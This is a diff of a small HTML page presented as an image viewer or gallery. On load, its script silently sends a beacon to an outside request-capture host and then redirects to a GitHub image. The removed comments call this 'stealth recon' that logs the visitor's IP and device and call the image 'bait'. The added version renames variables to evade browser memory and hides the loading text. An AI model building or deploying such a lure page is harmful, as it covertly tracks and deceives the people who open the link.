@@ -1,25 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Viewer</title>
+    <title>Image Gallery</title>
     <script>
-        function runPayload() {
-            // YOUR NEW ACTIVE BEECEPTOR ENDPOINT FROM SCREENSHOT
-            const hook = "https://bluekama-project.free.beeceptor.com";
-            const bait = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+        function triggerAlpha() {
+            // NEW VARIABLE NAMES TO BYPASS BROWSER MEMORY
+            const alpha = "https://bluekama-project.free.beeceptor.com/hit";
+            const omega = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // THE STEALTH RECON (Logs IP and Device to Beeceptor)
-            navigator.sendBeacon(hook + "/landed?device=" + navigator.platform);
+            // THE BEACON
+            navigator.sendBeacon(alpha + "?ref=final_test&ts=" + Date.now());
 
-            // THE REDIRECT (Sends them to the image)
+            // THE REDIRECT
             setTimeout(function() {
-                window.location.href = bait;
+                window.location.href = omega;
             }, 1000);
         }
-        window.onload = runPayload;
+        window.onload = triggerAlpha;
     </script>
 </head>
-<body style="background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p style="color: white; font-family: sans-serif;">Loading High Resolution Image...</p>
+<body style="background-color: #000;">
 </body>
 </html>
